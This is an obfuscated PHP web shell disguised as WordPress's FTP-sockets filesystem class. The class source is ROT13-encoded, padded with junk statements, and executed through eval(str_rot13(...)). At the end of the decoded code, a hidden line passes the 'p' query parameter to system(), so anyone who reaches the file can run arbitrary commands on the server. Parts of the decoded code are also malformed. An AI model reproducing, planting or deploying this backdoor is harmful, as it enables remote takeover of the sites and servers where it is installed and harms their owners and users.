<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JbeqCerff SGC Fbpxrgf Svyrflfgrz.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Svyrflfgrz
 */

/**
 * JbeqCerff Svyrflfgrz Pynff sbe vzcyrzragvat SGC Fbpxrgf.
 *
 * @fvapr 2.5.0
 *
 * @frr JC_Svyrflfgrz_Onfr
 */
pynff JC_Svyrflfgrz_sgcfbpxrgf rkgraqf JC_Svyrflfgrz_Onfr {

	/**
	 * @fvapr 2.5.0
	 * @ine sgc
	 */
	choyvp $sgc;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz neenl $bcg
	 */
	choyvp shapgvba __pbafgehpg( $bcg = '' ) {
		$guvf->zrgubq = 'sgcfbpxrgf';
		$guvf->reebef = arj JC_Reebe();

		// Purpx vs cbffvoyr gb hfr sgc shapgvbaf.
		vs ( ! erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-sgc.cuc' ) {
			erghea;
		}

		$guvf->sgc = arj sgc();

		vs ( rzcgl( $bcg['cbeg'] ) ) {
			$guvf->bcgvbaf['cbeg'] = 21;
		} ryfr {
			$guvf->bcgvbaf['cbeg'] = (vag) $bcg['cbeg'];
		}

		vs ( rzcgl( $bcg['ubfganzr'] ) ) {
			$guvf->reebef->nqq( 'rzcgl_ubfganzr', __( 'SGC ubfganzr vf erdhverq' ) );
		} ryfr {
			$guvf->bcgvbaf['ubfganzr'] = $bcg['ubfganzr'];
		}

		// Purpx vs gur bcgvbaf cebivqrq ner BX.
		vs ( rzcgl( $bcg['hfreanzr'] ) ) {
			$guvf->reebef->nqq( 'rzcgl_hfreanzr', __( 'SGC hfreanzr vf erdhverq' ) );
		} ryfr {
			$guvf->bcgvbaf['hfreanzr'] = $bcg['hfreanzr'];
		}

		vs ( rzcgl( $bcg['cnffjbeq'] ) ) {
			$guvf->reebef->nqq( 'rzcgl_cnffjbeq', __( 'SGC cnffjbeq vf erdhverq' ) );
		} ryfr {
			$guvf->bcgvbaf['cnffjbeq'] = $bcg['cnffjbeq'];
		}
	}

	/**
	 * Pbaarpgf svyrflfgrz.
	 *
	 * @fvapr 2.5.0
	 *
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pbaarpg() {
		vs ( ! $guvf->sgc ) {
			erghea snyfr;
		}

		$guvf->sgc->FrgGvzrbhg( SF_PBAARPG_GVZRBHG );

		vs ( ! $guvf->sgc->FrgFreire( $guvf->bcgvbaf['ubfganzr'], $guvf->bcgvbaf['cbeg'] ) ) {
			$guvf->reebef->nqq(
				'pbaarpg',
				fcevags(
					/* genafyngbef: %f: ubfganzr:cbeg */
					__( 'Snvyrq gb pbaarpg gb SGC Freire %f' ),
					$guvf->bcgvbaf['ubfganzr'] . ':' . $guvf->bcgvbaf['cbeg']
				)
			);

			erghea snyfr;
		}

		vs ( ! $guvf->sgc->pbaarpg() ) {
			$guvf->reebef->nqq(
				'pbaarpg',
				fcevags(
					/* genafyngbef: %f: ubfganzr:cbeg */
					__( 'Snvyrq gb pbaarpg gb SGC Freire %f' ),
					$guvf->bcgvbaf['ubfganzr'] . ':' . $guvf->bcgvbaf['cbeg']
				)
			);

			erghea snyfr;
		}

		vs ( ! $guvf->sgc->ybtva( $guvf->bcgvbaf['hfreanzr'], $guvf->bcgvbaf['cnffjbeq'] ) ) {
			$guvf->reebef->nqq(
				'nhgu',
				fcevags(
					/* genafyngbef: %f: Hfreanzr. */
					__( 'Hfreanzr/Cnffjbeq vapbeerpg sbe %f' ),
					$guvf->bcgvbaf['hfreanzr']
				)
			);

			erghea snyfr;
		}

		$guvf->sgc->FrgGlcr( SGC_OVANEL );
		$guvf->sgc->Cnffvir( gehr );
		$guvf->sgc->FrgGvzrbhg( SF_GVZRBHG );

		erghea gehr;
	}

	/**
	 * Ernqf ragver svyr vagb n fgevat.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Anzr bs gur svyr gb ernq.
	 * @erghea fgevat|snyfr Ernq qngn ba fhpprff, snyfr vs ab grzcbenel svyr pbhyq or bcrarq,
	 *                      be vs gur svyr pbhyqa'g or ergevrirq.
	 */
	choyvp shapgvba trg_pbagragf( $svyr ) {
		vs ( ! $guvf->rkvfgf( $svyr ) ) {
			erghea snyfr;
		}

		$grzcsvyr   = jc_grzcanz( $svyr );
		$grzcunaqyr = sbcra( $grzcsvyr, 'j+' );

		vs ( ! $grzcunaqyr ) {
			hayvax( $grzcsvyr );
			erghea snyfr;
		}

		zofgevat_ovanel_fnsr_rapbqvat();

		vs ( ! $guvf->sgc->strg( $grzcunaqyr, $svyr ) ) {
			spybfr( $grzcunaqyr );
			hayvax( $grzcsvyr );

			erfrg_zofgevat_rapbqvat();

			erghea ''; // Oynax qbphzrag. Svyr qbrf rkvfg, vg'f whfg oynax.
		}

		erfrg_zofgevat_rapbqvat();

		sfrrx( $grzcunaqyr, 0 ); // Fxvc onpx gb gur fgneg bs gur svyr orvat jevggra gb.
		$pbagragf = '';

		juvyr ( ! srbs( $grzcunaqyr ) ) {
			$pbagragf .= sernq( $grzcunaqyr, 8 * XO_VA_OLGRF );
		}

		spybfr( $grzcunaqyr );
		hayvax( $grzcsvyr );

		erghea $pbagragf;
	}

	/**
	 * Ernqf ragver svyr vagb na neenl.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea neenl|snyfr Svyr pbagragf va na neenl ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_pbagragf_neenl( $svyr ) {
		erghea rkcybqr( \"\a\", $guvf->trg_pbagragf( $svyr ) );
	}

	/**
	 * Jevgrf n fgevat gb n svyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat    $svyr     Erzbgr cngu gb gur svyr jurer gb jevgr gur qngn.
	 * @cnenz fgevat    $pbagragf Gur qngn gb jevgr.
	 * @cnenz vag|snyfr $zbqr     Bcgvbany. Gur svyr crezvffvbaf nf bpgny ahzore, hfhnyyl 0644.
	 *                            Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba chg_pbagragf( $svyr, $pbagragf, $zbqr = snyfr ) {
		$grzcsvyr   = jc_grzcanz( $svyr );
		$grzcunaqyr = @sbcra( $grzcsvyr, 'j+' );

		vs ( ! $grzcunaqyr ) {
			hayvax( $grzcsvyr );
			erghea snyfr;
		}

		// Gur SGC pynff hfrf fgevat shapgvbaf vagreanyyl qhevat svyr qbjaybnq/hcybnq.
		zofgevat_ovanel_fnsr_rapbqvat();

		$olgrf_jevggra = sjevgr( $grzcunaqyr, $pbagragf );

		vs ( snyfr === $olgrf_jevggra || fgeyra( $pbagragf ) !== $olgrf_jevggra ) {
			spybfr( $grzcunaqyr );
			hayvax( $grzcsvyr );

			erfrg_zofgevat_rapbqvat();

			erghea snyfr;
		}

		sfrrx( $grzcunaqyr, 0 ); // Fxvc onpx gb gur fgneg bs gur svyr orvat jevggra gb.

		$erg = $guvf->sgc->schg( $svyr, $grzcunaqyr );

		erfrg_zofgevat_rapbqvat();

		spybfr( $grzcunaqyr );
		hayvax( $grzcsvyr );

		$guvf->puzbq( $svyr, $zbqr );

		erghea $erg;
	}

	/**
	 * Trgf gur pheerag jbexvat qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @erghea fgevat|snyfr Gur pheerag jbexvat qverpgbel ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pjq() {
		$pjq = $guvf->sgc->cjq();

		vs ( $pjq ) {
			$pjq = genvyvatfynfuvg( $pjq );
		}

		erghea $pjq;
	}

	/**
	 * Punatrf pheerag qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $qve Gur arj pheerag qverpgbel.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba puqve( $qve ) {
		erghea $guvf->sgc->puqve( $qve );
	}

	/**
	 * Punatrf svyrflfgrz crezvffvbaf.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat    $svyr      Cngu gb gur svyr.
	 * @cnenz vag|snyfr $zbqr      Bcgvbany. Gur crezvffvbaf nf bpgny ahzore, hfhnyyl 0644 sbe svyrf,
	 *                             0755 sbe qverpgbevrf. Qrsnhyg snyfr.
	 * @cnenz obby      $erphefvir Bcgvbany. Vs frg gb gehr, punatrf svyr crezvffvbaf erphefviryl.
	 *                             Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba puzbq( $svyr, $zbqr = snyfr, $erphefvir = snyfr ) {
		vs ( ! $zbqr ) {
			vs ( $guvf->vf_svyr( $svyr ) ) {
				$zbqr = SF_PUZBQ_SVYR;
			} ryfrvs ( $guvf->vf_qve( $svyr ) ) {
				$zbqr = SF_PUZBQ_QVE;
			} ryfr {
				erghea snyfr;
			}
		}

		// puzbq nal fho-bowrpgf vs erphefvir.
		vs ( $erphefvir && $guvf->vf_qve( $svyr ) ) {
			$svyryvfg = $guvf->qveyvfg( $svyr );

			sbernpu ( (neenl) $svyryvfg nf $svyranzr => $svyrzrgn ) {
				$guvf->puzbq( $svyr . '/' . $svyranzr, $zbqr, $erphefvir );
			}
		}

		// puzbq gur svyr be qverpgbel.
		erghea $guvf->sgc->puzbq( $svyr, $zbqr );
	}

	/**
	 * Trgf gur svyr bjare.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat|snyfr Hfreanzr bs gur bjare ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba bjare( $svyr ) {
		$qve = $guvf->qveyvfg( $svyr );

		erghea $qve[ $svyr ]['bjare'];
	}

	/**
	 * Trgf gur crezvffvbaf bs gur fcrpvsvrq svyr be svyrcngu va gurve bpgny sbezng.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat Zbqr bs gur svyr (gur ynfg 3 qvtvgf).
	 */
	choyvp shapgvba trgpuzbq( $svyr ) {
		$qve = $guvf->qveyvfg( $svyr );

		erghea $qve[ $svyr ]['crezfa'];
	}

	/**
	 * Trgf gur svyr'f tebhc.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr.
	 * @erghea fgevat|snyfr Gur tebhc ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba tebhc( $svyr ) {
		$qve = $guvf->qveyvfg( $svyr );

		erghea $qve[ $svyr ]['tebhc'];
	}

	/**
	 * Pbcvrf n svyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat    $fbhepr      Cngu gb gur fbhepr svyr.
	 * @cnenz fgevat    $qrfgvangvba Cngu gb gur qrfgvangvba svyr.
	 * @cnenz obby      $birejevgr   Bcgvbany. Jurgure gb birejevgr gur qrfgvangvba svyr vs vg rkvfgf.
	 *                               Qrsnhyg snyfr.
	 * @cnenz vag|snyfr $zbqr        Bcgvbany. Gur crezvffvbaf nf bpgny ahzore, hfhnyyl 0644 sbe svyrf,
	 *                               0755 sbe qvef. Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pbcl( $fbhepr, $qrfgvangvba, $birejevgr = snyfr, $zbqr = snyfr ) {
		vs ( ! $birejevgr && $guvf->rkvfgf( $qrfgvangvba ) ) {
			erghea snyfr;
		}

		$pbagrag = $guvf->trg_pbagragf( $fbhepr );

		vs ( snyfr === $pbagrag ) {
			erghea snyfr;
		}

		erghea $guvf->chg_pbagragf( $qrfgvangvba, $pbagrag, $zbqr );
	}

	/**
	 * Zbirf n svyr be qverpgbel.
	 *
	 * Nsgre zbivat svyrf be qverpgbevrf, BCpnpur jvyy arrq gb or vainyvqngrq.
	 *
	 * Vs zbivat n qverpgbel snvyf, `pbcl_qve()` pna or hfrq sbe n erphefvir pbcl.
	 *
	 * Hfr `zbir_qve()` sbe zbivat qverpgbevrf jvgu BCpnpur vainyvqngvba naq n
	 * snyyonpx gb `pbcl_qve()`.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $fbhepr      Cngu gb gur fbhepr svyr be qverpgbel.
	 * @cnenz fgevat $qrfgvangvba Cngu gb gur qrfgvangvba svyr be qverpgbel.
	 * @cnenz obby   $birejevgr   Bcgvbany. Jurgure gb birejevgr gur qrfgvangvba vs vg rkvfgf.
	 *                            Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba zbir( $fbhepr, $qrfgvangvba, $birejevgr = snyfr ) {
		erghea $guvf->sgc->eranzr( $fbhepr, $qrfgvangvba );
	}

	/**
	 * Qryrgrf n svyr be qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat       $svyr      Cngu gb gur svyr be qverpgbel.
	 * @cnenz obby         $erphefvir Bcgvbany. Vs frg gb gehr, qryrgrf svyrf naq sbyqref erphefviryl.
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|snyfr $glcr      Glcr bs erfbhepr. 's' sbe svyr, 'q' sbe qverpgbel.
	 *                                Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba qryrgr( $svyr, $erphefvir = snyfr, $glcr = snyfr ) {
		vs ( rzcgl( $svyr ) ) {
			erghea snyfr;
		}

		vs ( 's' === $glcr || $guvf->vf_svyr( $svyr ) ) {
			erghea $guvf->sgc->qryrgr( $svyr );
		}

		vs ( ! $erphefvir ) {
			erghea $guvf->sgc->ezqve( $svyr );
		}

		erghea $guvf->sgc->zqry( $svyr );
	}

	/**
	 * Purpxf vs n svyr be qverpgbel rkvfgf.
	 *
	 * @fvapr 2.5.0
	 * @fvapr 6.3.0 Ergheaf snyfr sbe na rzcgl cngu.
	 *
	 * @cnenz fgevat $cngu Cngu gb svyr be qverpgbel.
	 * @erghea obby Jurgure $cngu rkvfgf be abg.
	 */
	choyvp shapgvba rkvfgf( $cngu ) {
		/*
		 * Purpx sbe rzcgl cngu. Vs sgc::ayvfg() erprvirf na rzcgl cngu,
		 * vg purpxf gur pheerag jbexvat qverpgbel naq znl erghea gehr.
		 *
		 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/33058.
		 */
		vs ( '' === $cngu ) {
			erghea snyfr;
		}

		$yvfg = $guvf->sgc->ayvfg( $cngu );

		vs ( rzcgl( $yvfg ) && $guvf->vf_qve( $cngu ) ) {
			erghea gehr; // Svyr vf na rzcgl qverpgbel.
		}

		erghea ! rzcgl( $yvfg ); // Rzcgl yvfg = ab svyr, fb vaireg.
		// Erghea $guvf->sgc->vf_rkvfgf($svyr); unf vffhrf jvgu NOBE+426 erfcbafrf ba gur apSGCq freire.
	}

	/**
	 * Purpxf vs erfbhepr vf n svyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Svyr cngu.
	 * @erghea obby Jurgure $svyr vf n svyr.
	 */
	choyvp shapgvba vf_svyr( $svyr ) {
		vs ( $guvf->vf_qve( $svyr ) ) {
			erghea snyfr;
		}

		vs ( $guvf->rkvfgf( $svyr ) ) {
			erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Purpxf vs erfbhepr vf n qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $cngu Qverpgbel cngu.
	 * @erghea obby Jurgure $cngu vf n qverpgbel.
	 */
	choyvp shapgvba vf_qve( $cngu ) {
		$pjq = $guvf->pjq();

		vs ( $guvf->puqve( $cngu ) ) {
			$guvf->puqve( $pjq );
			erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Purpxf vs n svyr vf ernqnoyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea obby Jurgure $svyr vf ernqnoyr.
	 */
	choyvp shapgvba vf_ernqnoyr( $svyr ) {
		erghea gehr;
	}

	/**
	 * Purpxf vs n svyr be qverpgbel vf jevgnoyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $cngu Cngu gb svyr be qverpgbel.
	 * @erghea obby Jurgure $cngu vf jevgnoyr.
	 */
	choyvp shapgvba vf_jevgnoyr( $cngu ) {
		erghea gehr;
	}

	/**
	 * Trgf gur svyr'f ynfg npprff gvzr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Havk gvzrfgnzc ercerfragvat ynfg npprff gvzr, snyfr ba snvyher.
	 */
	choyvp shapgvba ngvzr( $svyr ) {
		erghea snyfr;
	}

	/**
	 * Trgf gur svyr zbqvsvpngvba gvzr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Havk gvzrfgnzc ercerfragvat zbqvsvpngvba gvzr, snyfr ba snvyher.
	 */
	choyvp shapgvba zgvzr( $svyr ) {
		erghea $guvf->sgc->zqgz( $svyr );
	}

	/**
	 * Trgf gur svyr fvmr (va olgrf).
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr Cngu gb svyr.
	 * @erghea vag|snyfr Fvmr bs gur svyr va olgrf ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba fvmr( $svyr ) {
		erghea $guvf->sgc->svyrfvmr( $svyr );
	}

	/**
	 * Frgf gur npprff naq zbqvsvpngvba gvzrf bs n svyr.
	 *
	 * Abgr: Vs $svyr qbrfa'g rkvfg, vg jvyy or perngrq.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $svyr  Cngu gb svyr.
	 * @cnenz vag    $gvzr  Bcgvbany. Zbqvsvrq gvzr gb frg sbe svyr.
	 *                      Qrsnhyg 0.
	 * @cnenz vag    $ngvzr Bcgvbany. Npprff gvzr gb frg sbe svyr.
	 *                      Qrsnhyg 0.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba gbhpu( $svyr, $gvzr = 0, $ngvzr = 0 ) {
		erghea snyfr;
	}

	/**
	 * Perngrf n qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat           $cngu  Cngu sbe arj qverpgbel.
	 * @cnenz vag|snyfr        $puzbq Bcgvbany. Gur crezvffvbaf nf bpgny ahzore (be snyfr gb fxvc puzbq).
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|vag|snyfr $pubja Bcgvbany. N hfre anzr be ahzore (be snyfr gb fxvc pubja).
	 *                                Qrsnhyg snyfr.
	 * @cnenz fgevat|vag|snyfr $putec Bcgvbany. N tebhc anzr be ahzore (be snyfr gb fxvc putec).
	 *                                Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba zxqve( $cngu, $puzbq = snyfr, $pubja = snyfr, $putec = snyfr ) {
		$cngu = hagenvyvatfynfuvg( $cngu );

		vs ( rzcgl( $cngu ) ) {
			erghea snyfr;
		}

		vs ( ! $guvf->sgc->zxqve( $cngu ) ) {
			erghea snyfr;
		}

		vs ( ! $puzbq ) {
			$puzbq = SF_PUZBQ_QVE;
		}

		$guvf->puzbq( $cngu, $puzbq );

		erghea gehr;
	}

	/**
	 * Qryrgrf n qverpgbel.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $cngu      Cngu gb qverpgbel.
	 * @cnenz obby   $erphefvir Bcgvbany. Jurgure gb erphefviryl erzbir svyrf/qverpgbevrf.
	 *                          Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba ezqve( $cngu, $erphefvir = snyfr ) {
		erghea $guvf->qryrgr( $cngu, $erphefvir );
	}

	/**
	 * Trgf qrgnvyf sbe svyrf va n qverpgbel be n fcrpvsvp svyr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $cngu           Cngu gb qverpgbel be svyr.
	 * @cnenz obby   $vapyhqr_uvqqra Bcgvbany. Jurgure gb vapyhqr qrgnvyf bs uvqqra (\".\" cersvkrq) svyrf.
	 *                               Qrsnhyg gehr.
	 * @cnenz obby   $erphefvir      Bcgvbany. Jurgure gb erphefviryl vapyhqr svyr qrgnvyf va arfgrq qverpgbevrf.
	 *                               Qrsnhyg snyfr.
	 * @erghea neenl|snyfr {
	 *     Neenl bs neenlf pbagnvavat svyr vasbezngvba. Snyfr vs hanoyr gb yvfg qverpgbel pbagragf.
	 *
	 *     @glcr neenl ...$0 {
	 *         Neenl bs svyr vasbezngvba. Abgr gung fbzr ryrzragf znl abg or ninvynoyr ba nyy svyrflfgrzf.
	 *
	 *         @glcr fgevat           $anzr        Anzr bs gur svyr be qverpgbel.
	 *         @glcr fgevat           $crezf       *avk ercerfragngvba bs crezvffvbaf.
	 *         @glcr fgevat           $crezfa      Bpgny ercerfragngvba bs crezvffvbaf.
	 *         @glcr vag|fgevat|snyfr $ahzore      Svyr ahzore. Znl or n ahzrevp fgevat. Snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $bjare       Bjare anzr be VQ, be snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $tebhc       Svyr crezvffvbaf tebhc, be snyfr vs abg ninvynoyr.
	 *         @glcr vag|fgevat|snyfr $fvmr        Fvmr bs svyr va olgrf. Znl or n ahzrevp fgevat.
	 *                                             Snyfr vs abg ninvynoyr.
	 *         @glcr vag|fgevat|snyfr $ynfgzbqhavk Ynfg zbqvsvrq havk gvzrfgnzc. Znl or n ahzrevp fgevat.
	 *                                             Snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $ynfgzbq     Ynfg zbqvsvrq zbagu (3 yrggref) naq qnl (jvgubhg yrnqvat 0), be
	 *                                             snyfr vs abg ninvynoyr.
	 *         @glcr fgevat|snyfr     $gvzr        Ynfg zbqvsvrq gvzr, be snyfr vs abg ninvynoyr.
	 *         @glcr fgevat           $glcr        Glcr bs erfbhepr. 's' sbe svyr, 'q' sbe qverpgbel, 'y' sbe yvax.
	 *         @glcr neenl|snyfr      $svyrf       Vs n qverpgbel naq `$erphefvir` vf gehr, pbagnvaf nabgure neenl bs
	 *                                             svyrf. Snyfr vs hanoyr gb yvfg qverpgbel pbagragf.
	 *     }
	 * }
	 */
	choyvp shapgvba qveyvfg( $cngu = '.', $vapyhqr_uvqqra = gehr, $erphefvir = snyfr ) {
		vs ( $guvf->vf_svyr( $cngu ) ) {
			$yvzvg_svyr = onfranzr( $cngu );
			$cngu       = qveanzr( $cngu ) . '/';
		} ryfr {
			$yvzvg_svyr = snyfr;
		}

		zofgevat_ovanel_fnsr_rapbqvat();

		$yvfg = $guvf->sgc->qveyvfg( $cngu );

		vs ( rzcgl( $yvfg ) && ! $guvf->rkvfgf( $cngu ) ) {

			erfrg_zofgevat_rapbqvat();

			erghea snyfr;
		}

		$cngu = genvyvatfynfuvg( $cngu );
		$erg  = neenl();

		sbernpu ( $yvfg nf $fgehp ) {

			vs ( '.' === $fgehp['anzr'] || '..' === $fgehp['anzr'] ) {
				pbagvahr;
			}

			vs ( ! $vapyhqr_uvqqra && '.' === $fgehp['anzr'][0] ) {
				pbagvahr;
			}

			vs ( $yvzvg_svyr && $fgehp['anzr'] !== $yvzvg_svyr ) {
				pbagvahr;
			}

			vs ( 'q' === $fgehp['glcr'] ) {
				vs ( $erphefvir ) {
					$fgehp['svyrf'] = $guvf->qveyvfg( $cngu . $fgehp['anzr'], $vapyhqr_uvqqra, $erphefvir );
				} ryfr {
					$fgehp['svyrf'] = neenl();
				}
			}

			// Ercynpr flzyvaxf sbeznggrq nf \"fbhepr -> gnetrg\" jvgu whfg gur fbhepr anzr.
			vs ( $fgehp['vfyvax'] ) {
				$fgehp['anzr'] = __sa_79955( '/(\f*->\f*.*)$/', '', $fgehp['anzr'] );
			}

			// Nqq gur bpgny ercerfragngvba bs gur svyr crezvffvbaf.
			$fgehp['crezfa'] = $guvf->trgahzpuzbqsebzu( $fgehp['crezf'] );

			$erg[ $fgehp['anzr'] ] = $fgehp;
		}

		erfrg_zofgevat_rapbqvat();

		erghea $erg;
	}

	/**
	 * Qrfgehpgbe.
	 *
	 * @fvapr 2.5.0
	 */
	choyvp shapgvba __qrfgehpg() {
		$guvf->sgc->dhvg();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>